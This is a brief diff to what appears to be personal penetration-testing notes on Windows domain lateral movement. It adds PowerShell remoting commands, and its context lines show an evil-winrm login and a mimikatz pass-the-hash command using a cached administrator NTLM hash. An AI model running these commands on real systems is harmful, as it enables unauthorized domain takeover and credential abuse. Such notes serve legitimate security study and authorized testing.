@@ -184,6 +184,11 @@
         //in kali
         $ evil-winrm -u $uesrn -p passwd -i 10.0.2.14 
 
+        // ps - only if this user has the admin privi on this host
+        $New-PSSession -ComputerName $name  //to start a new ps session
+
+        $Enter-PSSession 1   //to enter this session
+
     ### if the DC administrator login on a host. use mimikatz get the cached hash. apply TGT
         $mimikatz # sekurlas::pth /user:$Aministror /domain:inmy.com /ntlm <hash> /run:PowerShell.exe
       
